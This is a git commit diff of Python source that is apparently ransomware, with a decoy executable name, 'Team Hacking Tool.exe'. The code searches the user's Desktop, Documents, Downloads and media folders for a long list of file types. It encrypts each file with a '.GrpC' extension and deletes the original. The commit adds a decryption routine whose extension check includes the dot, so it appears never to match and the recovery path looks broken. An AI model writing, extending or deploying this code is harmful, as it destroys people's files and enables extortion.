2953a0d8c61df24e5cb989e8278700b4a7696259
LordGhostX <solomonghost9@gmail.com>
2019-08-16 01:59:46 +0000

    added file decryption

--- source/main.py
+++ source/main.py
@@ -2,8 +2,9 @@ import os
 from pyAesCrypt import encryptFile, decryptFile
 
 project_name = "Team Hacking Tool.exe"
+filext = ".GrpC"
 
-def find_files():
+def find_files(mode="E"):
     allFiles = []
     valid_extensions = ["der", "pfx", "key", "crt", "csr", "p12", "pem", "odt", "ott", "sxw", "stw", "uot", "3ds", "max", "3dm", "ods", "ots", "sxc", "stc", "dif", "slk", "wb2", "odp", "otp", "sxd", "std", "uop", "odg", "otg", "sxm", "mml", "lay", "lay6", "asc", "sqlite3", "sqlitedb", "sql", "mdb", "db", "dbf", "odb", "frm", "myd", "myi", "ibd", "mdf", "ldf", "sln", "suo", "cs", "c", "cpp", "pas", "h", "js", "vb", "pl", "dip", "dch", "sch", "brd", "jsp", "php", "asp", "rb", "java", "jar", "class", "sh", "mp3", "wav", "swf", "fla", "wmv", "mpg", "vob", "mpeg", "asf", "avi", "mov", "mp4", "3gp", "mkv", "3g2", "flv", "wma", "mid", "m3u", "m4u", "ai", "psd", "nef", "tiff", "tif", "cgm", "raw", "gif", "png", "bmp", "backup", "zip", "rar", "7z", "gz", "tgz", "tar", "bak", "tbk", "tar", "bz2", "paq", "arc", "aes", "gpg", "vmx", "vmdk", "vdi", "602", "hwp", "edb", "potm", "potx", "ppam", "ppsx", "ppsm", "pps", "pot", "pptm", "xltm", "xltx", "xlc", "xlm", "xlt", "xlw", "xlsb", "xlsm", "dotx", "dotm", "dot", "docm", "docb", "jpg", "jpeg", "dwg", "pdf", "rtf", "csv", "txt", "wk1", "wks", "123", "vsdx", "vsd", "eml", "msg", "ost", "pst", "pptx", "ppt", "xlsx", "xls", "docx", "doc"]
     allowed_dirs = ["Desktop", "Documents", "Downloads", "Music", "Videos", "Pictures"]
@@ -11,15 +12,28 @@ def find_files():
     for dirs in allowed_dirs:
         for root, subfiles, files in os.walk(os.path.join(username, dirs)):
             for names in files:
-                if names == project_name or names.split(".")[-1].lower() not in valid_extensions:
-                    continue
-                allFiles.append(os.path.join(root, names))
+                if mode == "E":
+                    if names == project_name or names.split(".")[-1].lower() not in valid_extensions:
+                        continue
+                    allFiles.append(os.path.join(root, names))
+                if mode == "D":
+                    if names.split(".")[-1].lower() != filext.lower():
+                        continue
+                    allFiles.append(os.path.join(root, names))
     return allFiles
 
 def encryptFiles(files, password):
     for file in files:
         try:
-            encryptFile(file, file+".aes", password, 64 * 1024)
+            encryptFile(file, file+filext, password, 64 * 1024)
+            os.remove(file)
+        except:
+            pass
+
+def decryptFiles(files, password):
+    for file in files:
+        try:
+            decryptFile(file, ".".join(file.split(".")[:-1]), password, 64 * 1024)
             os.remove(file)
         except:
             pass
